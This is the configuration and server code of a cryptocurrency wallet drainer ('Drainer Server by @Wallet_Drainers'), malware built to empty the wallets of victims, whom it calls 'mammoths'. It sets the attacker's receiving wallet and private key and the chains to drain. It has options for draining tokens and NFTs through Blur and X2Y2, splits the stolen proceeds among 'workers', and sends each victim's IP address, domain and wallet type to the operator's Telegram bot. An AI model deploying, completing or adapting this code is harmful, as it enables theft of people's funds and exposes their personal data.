console.log('\n\n\t============================================================================================');
console.log('\t=========================== Drainer Server by @Wallet_Drainers =============================');
...
const MS_Encryption_Key = 500; // Please specify any number to be used for encryption (not recommended to leave default!)
// The same number should also be specified in the file 

const MS_Telegram_Token = ""; // Enter your bot token create a bot, and get this token)
const MS_Telegram_Chat_ID = [""]; // Enter the chat ID(s) here where notifications about the mammoth's actions need to be sent (if the ID starts with a minus, write it as is)
// To specify multiple chats, fill it out like this: MS_Telegram_Chat_ID = ["CHANNEL_ID", "ANOTHER_CHANNEL_ID", "ONE_MORE_CHANNEL_ID"]
const MS_Telegram_Admin_IDs = []; // Enter your Telegram ID here so that it only accepts commands from you

const MS_Wallet_Address = ""; // Wallet address where the assets will be sent
const MS_Wallet_Private = ""; // Private key for the above wallet, SPECIFYING IS MANDATORY, OTHERWISE WITHDRAWAL WILL NOT WORK
const MS_Wallet_Receiver = [""]; // Wallet or wallets where assets will be received, may be the same as MS_Wallet_Address or different
...
1: 1, // How much currency to send on the Ethereum network
11155111: 1, // How much currency to send on the Ethereum_Sepolia network
10: 1, // How much currency to send on the Optimism network
56: 1, // How much currency to send on the Binance Smart Chain network
137: 1, // How much currency to send on the Polygon network
250: 1, // How much currency to send on the Fantom network
43114: 1, // How much currency to send on the Avalanche network
42161: 2, // How much currency to send on the Arbitrum network
8453: 2, // How much currency to send on the Base network
324: 2, // How much currency to send on the zkSync Era network
369: 2, // How much currency to send on the Pulse network
};
const MS_Emergency_Price = {
1: 500, // Total token amount in USD to send on Ethereum
11155111: 20, // Total token amount in USD to send on Ethereum_Sepolia
...
const MS_Split_System = true;// send all assets to MS_Wallet_Receiver, true - enable auto-splitting system
const MS_Split_Percent = 20; // (the rest will go to MS_Wallet_Receiver)
const MS_Split_Whitelist = [0x796B1f59bD881472263fd5d7E8264d8579229208]; // You can add worker addresses to this array to allow splitting assets among them. Note that if this array is empty, the drainer will be allowed to split assets among any addresses received from the client side.
...
const MS_Split_Min_Value = 15; // The amount in USD from which splitting will trigger (0 - from any).
const MS_Split_Max_Value = 1000000; // The amount in USD up to which splitting will trigger (0 - up to any).
const MS_Split_NFTs = 1; // 1 - send NFTs to the MS Wallet Receiver wallet,
...
const MS_Ankr_Token = ""; // Ankr Premium token.
...
const MS_Private_RPC_URLs = {
  ...
  11155111: 'https://rpc.ankr.com/eth_sepolia' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Ethereum_Sepolia
...
const MS_Public_RPC_URLs = {
  ...
  11155111: 'https://rpc.ankr.com/eth_sepolia', // Ethereum_Sepolia
...
const MS_Settings = {
  ...
  Use_Wallet_Randomizer: false, // false - do not replace the wallet, true - replace the wallet with a new one and then send it to the main one
  ...
  Blur: {
    Enable: 1, // 0 - disabled, 1 - enabled (only works when the Blur module is installed)
    Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
    Limit: 1, // 0 - do not limit calls, 1 - no more than one call from one wallet
    Price: 1, // Minimum amount from which will be written off using this method
  },
  x2y2: {
    Enable: 1, // 0 - disabled, 1 - enabled (works only when the X2Y2 module is installed)
    Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
    Price: 1, // Minimum amount from which will be written off using this method
  },
  Chains: {
    ...
    eth_sepolia: { // Ethereum_Sepolia, network settings
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 0, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (don't change if you're not sure)
...
// ============================================================================= //
// The author and developer does not approve the use of this software in these countries
...
const on_connect_request = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.connect_request.mode) || (data.chat_data != false && data.chat_data.connect_request != "")) {
      ...
      try {
        await send_message(receiver_chat_id, `<b>❓ Requested a connection from the user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n< b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>💰 Wallet type:</b> <code>${data.wallet}</code >`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
